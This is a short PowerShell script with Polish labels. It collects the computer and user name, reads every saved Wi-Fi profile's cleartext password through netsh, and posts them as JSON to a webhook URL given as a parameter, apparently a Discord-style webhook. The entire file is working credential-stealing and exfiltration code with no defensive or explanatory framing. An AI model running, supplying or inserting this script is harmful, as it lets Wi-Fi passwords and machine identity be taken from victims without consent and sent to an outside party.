param([string]$webhook)

$compName = $env:COMPUTERNAME
$userName = $env:USERNAME

$message = "===== ZAPISANE WI-FI =====`n"
$message += "KOMPUTER: $compName`n"
$message += "UZYTKOWNIK: $userName`n"
$message += "------------------------`n"

$profiles = netsh wlan show profiles | Select-String ":" | ForEach-Object {
    $name = $_ -replace ".*:\s+", ""
    $password = netsh wlan show profile name="$name" key=clear | Select-String "Key Content" | ForEach-Object {
        $_ -replace ".*:\s+", ""
    }
    if (!$password) { $password = "BRAK HASLA" }
    $message += "`nSSID: $name`nHASLO: $password`n"
}

if ($profiles.Count -eq 0) {
    $message += "`nBRAK ZAPISANYCH SIECI Wi-Fi"
}

$body = @{ content = $message } | ConvertTo-Json

try {
    Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body
    Write-Host "OK!" -ForegroundColor Green
} catch {
    Write-Host "BLAD: $_" -ForegroundColor Red
}
